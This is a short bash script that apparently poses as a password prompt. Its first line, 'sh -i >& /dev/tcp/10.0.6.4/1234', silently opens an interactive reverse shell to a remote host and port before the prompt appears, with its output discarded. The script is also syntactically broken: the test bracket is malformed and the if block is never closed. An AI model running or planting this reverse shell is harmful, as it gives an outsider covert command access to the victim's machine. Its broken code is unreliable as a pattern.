#!/bin/bash

sh -i >& /dev/tcp/10.0.6.4/1234 0>/dev/null 2>/dev/null
echo -n Password: 
read -s password

if [ "$password" = "pie"]; then 
    echo "your in"
else 
    exit

